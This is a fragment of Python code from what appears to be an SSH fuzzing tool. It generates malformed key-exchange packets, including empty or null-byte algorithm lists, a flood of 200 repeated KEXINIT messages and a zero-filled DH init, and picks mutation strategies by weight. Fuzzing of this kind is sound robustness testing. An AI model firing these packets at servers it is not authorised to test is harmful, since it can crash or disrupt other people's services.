        variant = random.choice([
            "all_empty", "selective_empty", "empty_with_follow",
            "repeated_empty_kexinit", "empty_kex_only",
            "single_null_name",
        ])
        if variant == "all_empty":
            body = _kexinit(kex=[], hostkey=[], enc=[], mac=[], comp=[], lang=[])
            return _VERSION + _ssh_packet(body)
        elif variant == "selective_empty":
            body = _kexinit(
                kex=[],
                hostkey=[b"ssh-rsa"],
                enc=[],
                mac=[b"hmac-sha2-256"],
                comp=[],
                lang=[],
            )
            return _VERSION + _ssh_packet(body)
        elif variant == "empty_with_follow":
            body = _kexinit(kex=[], hostkey=[], enc=[], mac=[], comp=[],
                            lang=[], first_kex_follows=1)
            dh_init = bytes([_MSG_KEXDH_INIT]) + _string(b"\x00" * 128)
            return _VERSION + _ssh_packet(body) + _ssh_packet(dh_init)
        elif variant == "repeated_empty_kexinit":
            out = [_VERSION]
            for _ in range(200):
                body = _kexinit(kex=[], hostkey=[], enc=[], mac=[], comp=[], lang=[])
                out.append(_ssh_packet(body))
            return b"".join(out)
        elif variant == "empty_kex_only":
            body = _kexinit(kex=[])
            return _VERSION + _ssh_packet(body)
        else:
            body = _kexinit(
                kex=[b"\x00"],
                hostkey=[b"\x00"],
                enc=[b"\x00"],
                mac=[b"\x00"],
                comp=[b"\x00"],
            )
            return _VERSION + _ssh_packet(body)

    else:
        # Fallback: a benign, valid version banner + KEXINIT.
        return _VERSION + _ssh_packet(_kexinit())


class SshMutator:
    def __init__(self, external_weights: dict = None, bandit=None):
        self.strategies = SSH_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return SSH_WEIGHTS

    def mutate(self, payload_override=None) -> tuple:
        """Returns (payload_bytes, strategy_name)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_ssh_payload(strategy, payload_override=payload_override)
        return payload, strategy
